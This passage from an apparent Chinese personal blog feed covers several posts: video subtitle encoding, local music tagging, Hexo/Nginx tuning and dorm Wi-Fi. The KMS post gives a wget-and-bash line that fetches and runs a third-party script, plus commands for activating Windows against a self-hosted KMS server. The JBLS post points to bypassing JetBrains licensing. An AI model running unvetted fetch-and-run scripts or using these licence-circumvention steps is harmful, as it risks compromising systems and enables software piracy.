title="字幕文件"></a>字幕文件</h2><p>由于我们组有专门做后期的 所以拿到字幕文件最主要是更改里面的图片路径</p><p>更改到自己电脑里对应的图片路径 记住图片路径必须用<code>反斜杠/</code>就行了</p><h2 id="压制"><a href="#压制" class="headerlink" title="压制"></a>压制</h2><p>OK 现在我们手上有原视频文件、字幕文件、用到的图片文件 系统里用到的字体</p><p>就可以开始压制了</p><p>打开 MeGUI 我们先来设置<code>输出</code>的视频和音频的规格</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuUPxJ.png" alt="AuUPxJ.png"></p><p>视频部分</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuUFM9.png" alt="AuUFM9.png"></p><p>音频部分</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuUJdP.png" alt="AuUJdP.png"></p><p>这部分照着设置就行了 有兴趣可以一起研究</p><p>这套设置可以说是浪费机器性能的 属于我时间比较多 机器你慢慢跑的类型</p><p>设置好之后记得<code>OK</code> 也可以<code>Update</code>一个出来日后使用</p><p>回到 MeGUI 的主界面 点击上方的<code>Tools--&gt;File Indexer</code></p><p>点击三个点然后选择原视频</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuU4y9.png" alt="AuU4y9.png"></p><p>稍等然后按右下角的<code>Queue</code> 然后要等等 会跳出<code>AVS 脚本编辑界面</code>和<code>预览界面</code></p><p>可以先关掉<code>预览界面</code> 在<code>AVS 脚本编辑界面</code>先设置好再预览</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AuULWD.png" alt="AuULWD.png"></p><p>设置好<code>Resize</code>的长边 切到换<code>Script 选项卡</code></p><p>根据<code>VSFilterMod.dll</code>和<code>字幕文件</code>修改下面代码并填入</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadPlugin(&quot;E:\xxx\VSFilterMod.dll&quot;)</span><br><span class="line">TextSubMod(&quot;E:\xxx\abc.ass&quot;, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>完成品类似这样</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Aua27t.png" alt="Aua27t.png"></p><p>然后可以按右下角的<code>Preview AVS Script</code>预览输出画面 看看图片之类的有没有设置错</p><p>确认无误后按<code>Save</code> 然后我们会回到 MeGUI 的主界面</p><p>在主界面 我们点击右下角的<code>AutoEncode</code> 会弹出这个</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/AudZ9O.png" alt="AudZ9O.png"></p><p><code>Container</code>也就是容器 选择 MP4 下面勾选<code>No Target Size</code></p><p><code>Name of output</code>选择输出的位置和名字</p><p>一切就绪 点击<code>Queue</code> 然后就是漫长的等待啦~</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul><li><p>更纱黑体 <a href="https://github.com/be5invis/Sarasa-Gothic/releases">Github 下载地址</a>  <a href="https://dddx-1253475808.cos.ap-hongkong.myqcloud.com/subtitlegroup/sarasa-gothic-ttc-0.8.0.7z">自用下载地址</a></p></li><li><p>酷黑黑体 <a href="https://file.zcool.cn/community/file/2018/6/10be2b5b5980380000013ef2703a1e.zip?Expires=1553000541&OSSAccessKeyId=lwQTEmwHzzSWSkqd&Signature=XQPDRx0Kiwz2hSsTrJfNNxUgU2o%3D">官方下载地址</a></p></li><li><p>VSFilterMod <a href="https://code.google.com/archive/p/vsfiltermod/downloads">Google 下载地址</a> <a href="https://dddx-1253475808.cos.ap-hongkong.myqcloud.com/subtitlegroup/VSFilterMod.dll">自用下载地址</a></p></li><li><p>MeGUI <a href="https://sourceforge.net/projects/megui/">官方下载地址</a>  <a href="https://dddx-1253475808.cos.ap-hongkong.myqcloud.com/subtitlegroup/MeGUI-2896-32.zip">自用下载地址</a></p></li><li><p>ffmpeg <a href="https://ffmpeg.org/download.html">官方下载地址</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      我都未上车呢？
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="字幕组" scheme="https://burgertown.tk/tags/%E5%AD%97%E5%B9%95%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>本地音乐体验补全计划</title>
    <link href="https://burgertown.tk/2018/04/27/Flyme7-Music/"/>
    <id>https://burgertown.tk/2018/04/27/Flyme7-Music/</id>
    <published>2018-04-27T02:44:03.000Z</published>
    <updated>2019-11-28T02:13:30.704Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>近日魅族开了个发布会 发布了 15 系列和 Flyme7 作为一个尝鲜控 当天我就更爆</p><p>更新之后系统自带的 <code>音乐</code> 变成了纯粹的本地播放器 而我个人也喜欢下载到本地来播放</p><p>更新之后无论是 <code>音乐</code> 本体还是播放时的锁屏真是美炸了</p><p>音乐应用的歌曲界面</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/C3w2WV.png" alt="C3w2WV.png"></p><p>用自带音乐应用播放音乐时的锁屏界面</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/C3086U.png" alt="C3086U.png"></p><p>Flyme 独有的状态栏歌词</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/C30N79.png" alt="C30N79.png"></p><p>但是我们下载的音乐经常会没有歌词和封面图</p><p>所以这篇文就是要补全本地音乐播放器的体验</p><p><strong>下面每篇的标题就是我们要用到的应用 都可以在 <a href="https://www.coolapk.com/">酷安</a> 下载安装</strong></p><h2 id="2019-11-28-更新-（推荐）"><a href="#2019-11-28-更新-（推荐）" class="headerlink" title="2019-11-28 更新 （推荐）"></a>2019-11-28 更新 （推荐）</h2><p>经过了一年半 很多应用都更新到了足够好用的地步</p><p>同样的很多应用已经不够好用了 例如总所周知的因为版权不够的<code>网易云音乐</code></p><p>所以如果只是要找一个能用的方案 只看这个篇章就足够了</p><h3 id="音乐标签-（原音乐标签编辑器）"><a href="#音乐标签-（原音乐标签编辑器）" class="headerlink" title="音乐标签 （原音乐标签编辑器）"></a>音乐标签 （原音乐标签编辑器）</h3><p>对 就是下文说到的音乐标签编辑器 经过更新 非常推荐用这个来一键解决体验问题</p><p>使用很简单 定位到音乐文件夹 点击右下的按钮-&gt;<code>自动匹配标签</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20191128100257.jpg" alt="20191128100257"></p><p>勾选<code>歌词（存到标签）</code> 是否覆盖就看你了</p><p>这样的操作会把歌词写入到标签里 转移音乐文件的时候也不会丢失歌词 算是一个 BOUNS 吧</p><p>然后我现在会更推荐这个软件 因为可以从多个源来获取音乐标签 同时这几个源也是一般人获取音乐的途径</p><p>所以比较少出现同名歌曲串台的情况 有的话手动修复也是很简单的</p><h3 id="歌词猎手"><a href="#歌词猎手" class="headerlink" title="歌词猎手"></a>歌词猎手</h3><p>这个软件更简单 首先根据提示 因为使用的 Flyme 系统 所以先把音乐文件移动到<code>/sdcard/Music</code>文件夹</p><p>然后在 App 里更新一下音乐目录 保证能更新出来后</p><p>点击右下角的按钮 就会自行获取所有的歌词 LRC 文件</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20191128101011.jpg" alt="20191128101011"></p><p>这样做只会获取歌词 要获取封面的话还是要配合音乐便签使用 所以。…</p><h2 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a>网易云音乐</h2><p>打开网易云音乐 定位到 <code>本地音乐</code> 右上角 点击 <code>获取封面歌词</code> 耐心等候</p><p><em>下载完不要杀网易云音乐的后台 因为后期编辑歌曲标签时可以使用网易云作为参考</em></p><h2 id="网易云歌词助手-2-0"><a href="#网易云歌词助手-2-0" class="headerlink" title="网易云歌词助手 2.0"></a>网易云歌词助手 2.0</h2><p>简单来说就是将网易云下载的歌词的 json 转为普通的歌词的 lrc 格式</p><p>安装打开后点击右上角的 <code>选项</code> 这个看个人爱好来选择</p><p>我个人就只勾选 <code>默认全选</code> 和 <code>加入其他非歌词头部信息</code></p><p><code>Load files from</code> 选择网易云下载的词图的文件夹路径</p><p>例如我的是 <code>/sdcard/netease/cloudmusic/Download/Lyric</code></p><p><em>如果是跟着本文操作的 那么应该都是上面这个路径</em></p><p><code>Save lrc file to</code> 选择保存 LRC 的位置 一般选择与音乐文件同目录即可</p><p>配置完毕后可以保存配置 或直接点击右上角的 <code>确认</code></p><p>点击左上角的 <code>运行</code> 耐心等待即可</p><p>第一次运行 建议全选 等待转码完成 按底部 <code>确认提取</code></p><p>程序就会将转码后的文件复制到上文设置的 <code>Save lrc file to</code> 的路径</p><h2 id="音乐标签编辑器-具体请看-2019-11-28-更新-）"><a href="#音乐标签编辑器-具体请看-2019-11-28-更新-）" class="headerlink" title="音乐标签编辑器 ( 具体请看 2019-11-28 更新 ）"></a>音乐标签编辑器 ( 具体请看 2019-11-28 更新 ）</h2><p>我们使用上一个应用基本上能解决歌词的问题 所以这个应用主要是用来解决封面图的问题</p><p>但实际上这个应用十分强大</p><p>安装打开后进入歌曲文件的文件夹 点击歌曲即可进入编辑界面</p><p>直接点击图片 选择<code>搜索网络</code> APP 就会根据标题和艺术家来查找对应的图片</p><p>选择自己认为是正确的 保存即可</p><p><em>这个应用暂时还没有批量自动匹配功能 所以歌曲多的就。…..</em></p><h2 id="小声-BB-几句"><a href="#小声-BB-几句" class="headerlink" title="小声 BB 几句"></a>小声 BB 几句</h2><p>我个人的本地音乐来自网易云和 QQ 音乐</p><ol><li>我发现 QQ 音乐下载的文件十分的 “原始”<br>没有封面图而且文件的命名像是版权方怎么给他就怎么给用户<br>这时可以使用 <code>音乐标签编辑器</code> 自行补充<br>由于没有对于用户友好的命名方式 所以在网易云下载的某些歌<br>使用 QQ 音乐的音质升级功能 可能会识别到另一首歌</li><li>通过修改网易云歌词助手 2.0 的 <code>Save lrc file to</code> 可以使 lrc 保存在不同文件夹哦</li><li>音乐播放器一般会在歌曲路径下寻找同名文件的 lrc 文件来匹配歌词<br>由于我们用的是网易云的歌词和图片接口 所以听 QQ 音乐下载的文件时 有时候会发现没有歌词<br>一般这时候进入 QQ 音乐的下载目录 修改对应的歌词的文件名即可<br><strong>如果没有发现对应的歌词文件 可以用 <code>音乐标签编辑器</code> 的搜索歌词功能或者自行下载</strong></li><li><strong>不推荐混用 APP</strong></li><li>2019-11-28: 音乐标签赛高 建议各位要备份好自己的音乐文件 毕竟在现在的网络环境下 下载党不好过（逃</li></ol>]]></content>
    
    <summary type="html">
    
      Flyme7 的音乐我吹爆
    
    </summary>
    
    
      <category term="Life" scheme="https://burgertown.tk/categories/Life/"/>
    
    
      <category term="Music" scheme="https://burgertown.tk/tags/Music/"/>
    
      <category term="Flyme" scheme="https://burgertown.tk/tags/Flyme/"/>
    
  </entry>
  
  <entry>
    <title>搭建 JBLS</title>
    <link href="https://burgertown.tk/2018/04/12/IDEA/"/>
    <id>https://burgertown.tk/2018/04/12/IDEA/</id>
    <published>2018-04-12T08:26:57.000Z</published>
    <updated>2019-09-29T18:06:26.029Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>偶然看到 JBLS 谷歌了一下 决定做起来</p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p><a href="http://blog.lanyus.com/archives/174.html">IntelliJ IDEA License Server 本地搭建教程</a></p><h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>由于我在本服务上搭了 所以激活的时候如图选择即可</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/CEiYUP.png" alt="CEiYUP.png"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>搭建的过程中顺手补了 Nginx 反代的配置 嘤嘤嘤</p>]]></content>
    
    <summary type="html">
    
      请支持正版
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="VPS" scheme="https://burgertown.tk/tags/VPS/"/>
    
      <category term="Nginx" scheme="https://burgertown.tk/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>关于 KMS 激活</title>
    <link href="https://burgertown.tk/2018/04/09/KMS/"/>
    <id>https://burgertown.tk/2018/04/09/KMS/</id>
    <published>2018-04-09T05:16:18.000Z</published>
    <updated>2020-11-07T07:42:10.694Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>这次速战速决 只介绍怎么用</p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>无意中发现 <a href="https://mrxn.net/Linux/kms-server-deploy.html">一键搭建 kms 激活服务端&amp;&amp;Windows 客户端一键激活脚本 @Mrxn</a> 的文章</p><p>恰好宿舍里有个同学不能使用激活工具激活 情急之下就使用了上述文章中的脚本进行搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/Mr-xn/kms-server-deploy/master/kms-server-deploy.sh &amp;&amp; bash kms-server-deploy.sh</span><br></pre></td></tr></table></figure><p>然后选择 1 即可完成安装与启动</p><p>设置防火墙放行 tcp1688 端口 并重新加载配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=1688/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>服务端设置完毕</p><h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>使用管理员权限打开 CMD 手动输入或者直接做成 BAT 批处理文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">slmgr.vbs -upk #卸载密钥</span><br><span class="line">slmgr.vbs -ipk W269N-WFGWX-YVC9B-<span class="number">4</span>J6C9-T83GX #安装密钥 不同系统请使用不同的密钥</span><br><span class="line">slmgr.vbs -skms burgertown.tk #设置激活服务器为本服务器</span><br><span class="line">slmgr.vbs -ato #激活</span><br><span class="line">slmgr.vbs -dlv #检查授权情况</span><br></pre></td></tr></table></figure><p>更多密钥请自行百度</p><p>或者查看 <a href="https://mrxn.net/Linux/kms-server-deploy.html">一键搭建 kms 激活服务端&amp;&amp;Windows 客户端一键激活脚本 @Mrxn</a> 后面的表格</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>再次感谢 <a href="https://mrxn.net/">@Mrxn</a> 让我水了一期</p>]]></content>
    
    <summary type="html">
    
      能用就行
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="VPS" scheme="https://burgertown.tk/tags/VPS/"/>
    
  </entry>
  
  <entry>
    <title>对 Hexo+Nginx 进行优化</title>
    <link href="https://burgertown.tk/2018/04/08/Boost/"/>
    <id>https://burgertown.tk/2018/04/08/Boost/</id>
    <published>2018-04-08T10:18:47.000Z</published>
    <updated>2019-09-29T17:52:36.819Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>本站的服务器是一个只有 1C 1G 1Mbps 的配置的小辣鸡 <del>谁叫他便宜呢</del></p><p>很早之前就对这个 <a href="https://burgertown.tk/2017/07/11/Https-Nginx-Hexo-Git/">方案</a> 部署出来的加载速度表示不满了 而且也进行了相关的搜索</p><p>但是没有发现比较实用的方案</p><p>最近进行了一波搜索 却发现了挺多有趣的文章 所以决心下手了</p><h2 id="Hexo-端压缩"><a href="#Hexo-端压缩" class="headerlink" title="Hexo 端压缩"></a>Hexo 端压缩</h2><p>所谓 Hexo 端 就是未部署到云端前</p><h3 id="Hexo-生成的文件"><a href="#Hexo-生成的文件" class="headerlink" title="Hexo 生成的文件"></a>Hexo 生成的文件</h3><p> Hexo 通过对<code>Markdown</code>文件根据相应的主题生成出相应的<code>HTML</code>等静态文件</p><p>  其实 Hexo 生成文件的速度可谓是很快的了 那么访问慢的问题出现出哪呢</p><p>  <strong><em>出现在 Hexo 生成的文件里</em></strong></p><p>  Hexo 生成的无论是<code>HTML</code>、<code>CSS</code>还是<code>JS</code>文件都有大段的空白</p><p>  这使得文件偏大 下载和渲染时间偏长</p><h3 id="图片文件"><a href="#图片文件" class="headerlink" title="图片文件"></a>图片文件</h3><p>  这个就不用解释了</p><p><em>这里有两种解决方案可以选</em></p><h3 id="Minifier"><a href="#Minifier" class="headerlink" title="Minifier"></a>Minifier</h3><p>  在 Hexo 目录下打开终端 输入<code>npm install hexo-all-minifier --save</code></p><p>  安装完成即可 以后每次<code>hexo g</code>就会自动进行优化</p><h3 id="gulp"><a href="#gulp" class="headerlink" title="gulp"></a>gulp</h3><p>  gulp 本质上应该是个自动化流程工具</p><p>  <strong>注：2017/7/17 更新 由于 Gulp 的升级 gulp-minify-css 被弃用 转 gulp-clean-css gulp 的 task 语法变更</strong></p><p>  先安装 gulp</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp -g</span><br></pre></td></tr></table></figure><p>  再在在 Hexo 目录下打开终端 安装依赖</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install  gulp-clean-css gulp-babel gulp-uglify gulp-htmlmin gulp-htmlclean --save</span><br></pre></td></tr></table></figure><p>  在 Hexo 目录下新建<code>gulpfile.js</code>文件并粘贴代码</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cleancss = <span class="built_in">require</span>(<span class="string">&#x27;gulp-clean-css&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> babel = <span class="built_in">require</span>(<span class="string">&#x27;gulp-babel&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">&#x27;gulp-uglify&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlmin = <span class="built_in">require</span>(<span class="string">&#x27;gulp-htmlmin&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlclean = <span class="built_in">require</span>(<span class="string">&#x27;gulp-htmlclean&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩 public 目录 css</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-css&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">&#x27;./public/**/*.css&#x27;</span>)</span><br><span class="line">        .pipe(cleancss())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">&#x27;./public&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩 public 目录 html</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-html&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">&#x27;./public/**/*.html&#x27;</span>)</span><br><span class="line">        .pipe(htmlclean())</span><br><span class="line">        .pipe(htmlmin(&#123;</span><br><span class="line">            removeComments: <span class="literal">true</span>,</span><br><span class="line">            minifyJS: <span class="literal">true</span>,</span><br><span class="line">            minifyCSS: <span class="literal">true</span>,</span><br><span class="line">            minifyURLs: <span class="literal">true</span>,</span><br><span class="line">        &#125;))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">&#x27;./public&#x27;</span>))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩 public/js 目录 js</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-js&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src([<span class="string">&#x27;./public/**/*.js&#x27;</span>, <span class="string">&#x27;!./public/**/*.min.js&#x27;</span>])</span><br><span class="line">        .pipe(babel(&#123; <span class="attr">presets</span>: [<span class="string">&#x27;es2015&#x27;</span>] &#125;))</span><br><span class="line">        .pipe(uglify())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">&#x27;./public&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 gulp 命令时执行的任务</span></span><br><span class="line">gulp.task(<span class="string">&#x27;default&#x27;</span>, gulp.parallel(<span class="string">&#x27;minify-html&#x27;</span>, <span class="string">&#x27;minify-css&#x27;</span>, <span class="string">&#x27;minify-js&#x27;</span>));</span><br></pre></td></tr></table></figure><p>  完成后 以后生成完还需要进行压缩 再部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">gulp</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>我这里没有对图片进行压缩</p><p>因为我 Blog 里的图片要么是在放在 <a href="https://imgchr.com/">图床</a> 上 要么是 <a href="https://www.instagram.com/burgertowncn">Instagram</a> 上的 <del>毕竟小水管撑不起</del></p><p>所以我服务器上的图片 只有本站首页的个人头像与网站的图标 压缩一次就够了</p><p>至于怎么压缩 后面再说</p><h2 id="服务端压缩"><a href="#服务端压缩" class="headerlink" title="服务端压缩"></a>服务端压缩</h2><h3 id="开启-Nginx-的-Gzip-功能"><a href="#开启-Nginx-的-Gzip-功能" class="headerlink" title="开启 Nginx 的 Gzip 功能"></a>开启 Nginx 的 Gzip 功能</h3><p>只放出代码 直接在 Nginx.conf 文件里加入</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">gzip on;</span><br><span class="line">gzip_min_length 1k;</span><br><span class="line">gzip_comp_level 6;</span><br><span class="line">gzip_types</span><br><span class="line">  application/atom+xml</span><br><span class="line">    application/javascript</span><br><span class="line">    application/json</span><br><span class="line">    application/ld+json</span><br><span class="line">    application/manifest+json</span><br><span class="line">    application/rss+xml</span><br><span class="line">    application/vnd.geo+json</span><br><span class="line">    application/vnd.ms-fontobject</span><br><span class="line">    application/x-font-ttf</span><br><span class="line">    application/x-web-app-manifest+json</span><br><span class="line">    application/xhtml+xml</span><br><span class="line">    application/xml</span><br><span class="line">    font/opentype</span><br><span class="line">    image/bmp</span><br><span class="line">    image/svg+xml</span><br><span class="line">    image/x-icon</span><br><span class="line">    text/cache-manifest</span><br><span class="line">    text/css</span><br><span class="line">    text/plain</span><br><span class="line">    text/vcard</span><br><span class="line">    text/vnd.rim.location.xloc</span><br><span class="line">    text/vtt</span><br><span class="line">    text/x-component</span><br><span class="line">    text/x-cross-domain-policy;</span><br><span class="line">gzip_vary on;</span><br><span class="line">gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line">gzip_http_version  1.0;</span><br><span class="line">gzip_proxied       any;</span><br></pre></td></tr></table></figure><h3 id="设置缓存"><a href="#设置缓存" class="headerlink" title="设置缓存"></a>设置缓存</h3><p>这样就不需要每次打开网页都从服务器上下载文件 在 server 层级下加入</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">location ~* ^.+\.(ico|gif|jpg|jpeg|png)$ &#123;</span><br><span class="line">    access_log   off;</span><br><span class="line">    expires      30d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~* ^.+\.(css|js|txt|xml|swf|wav)$ &#123;</span><br><span class="line">    access_log   off;</span><br><span class="line">    expires      24h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~* ^.+\.(html|htm)$ &#123;</span><br><span class="line">    expires      1h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~* ^.+\.(eot|ttf|otf|woff|svg)$ &#123;</span><br><span class="line">    access_log   off;</span><br><span class="line">    expires  30d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>Pong 友，<a href="https://developers.google.com/speed/pagespeed/insights/?hl=zh-CN">Google 的网页性能优化工具</a> 了解一下</p><p>这个网站会对你的网站进行测速与评分 并给出优化建议 而且还会给出<strong>优化后的文件</strong>供你下载</p><p>我的个人头像图就是从那扒下来的</p><p>想了解相关知识的 推荐一个大佬的 Blog 点开的时候可以注意下这位大佬网站的打开速度</p><p>真的会被惊到</p><p><a href="https://imququ.com/">@Jerry Qu</a></p><p>相关链接：<br><a href="http://luckykun.com/work/2016-07-10/hexo-faster.html">hexo 博客进阶－性能优化 @luckykun</a></p><p><a href="https://xiaozhou.net/optimization-for-my-blog-2017-12-29.html">Blog 年底更新与优化 @Timothy</a></p>]]></content>
    
    <summary type="html">
    
      跑得比 XX 还快
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Web" scheme="https://burgertown.tk/tags/Web/"/>
    
      <category term="VPS" scheme="https://burgertown.tk/tags/VPS/"/>
    
      <category term="Nginx" scheme="https://burgertown.tk/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>关于宿舍内 Wifi 的杂谈</title>
    <link href="https://burgertown.tk/2018/03/24/5Gwifi/"/>
    <id>https://burgertown.tk/2018/03/24/5Gwifi/</id>
    <published>2018-03-24T15:00:42.000Z</published>
    <updated>2019-09-29T17:51:28.202Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>笔记本的网卡本是不支持 5G 的</p><p>在家的时候因为不能用家里的 5G 已经萌发了换网卡的年头</p><p>回到了学校之后 经过了好几次掉线 于是决心换一个无线网卡</p><p>经过与淘宝店家交流 下单了 Intel 的 AC 8265</p><p>这是一个 Wifi/蓝牙模块 支持 Wifi 的双频与蓝牙 4.2</p><h2 id="关于数量"><a href="#关于数量" class="headerlink" title="关于数量"></a>关于数量</h2><p>通过 Wifi Analyzer 的 UWP 版可以看到</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/9qdY1e.png" alt="9qdY1e.png"></p><p>这是 2.4G 的 Wifi 也就是大部分人能搜到的信号</p><p>图下面的圈里的数字表示对应的信号里有的 SSID 的数量</p><p>可以看到我这小小的宿舍可以搜到 19 个 2.4G 的 SSID</p><p>而且根据图上的数字 可以看出 11 信道争抢严重</p><p>那么 5G 的呢？<br><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/9qdBAP.png" alt="9qdBAP.png"></p><p>对的 只有我自己开的那个</p><h2 id="关于质量"><a href="#关于质量" class="headerlink" title="关于质量"></a>关于质量</h2><p>这里我只用了 ping 路由器的方式来表现 因为不知道还有什么其他好的方法</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/9qd5NV.png" alt="9qd5NV.png"></p><p>2.4G</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/9qdT9U.png" alt="9qdT9U.png"></p><p>5G 的</p><p>可以看出 5G 的稍微好一些 但是由于这个实验本来就不严谨 所以仅供参考</p><p>我个人曾经试过在 2.4G 下完全打不开路由器的管理页面</p><p>一 ping 路由器 80%的掉包 这是让我下决心换网卡的最后一根稻草</p><h2 id="关于我宿舍"><a href="#关于我宿舍" class="headerlink" title="关于我宿舍"></a>关于我宿舍</h2><p>由于宿舍的网络是我管理的 我也在用的 所以我印象特别深</p><p>由于时不时的掉线 我曾经尝试过换信道 设置 DHCP 与 IP 绑定等</p><p>确保没人蹭网的前提下 发现体验并没有改善</p><p>于是我思考 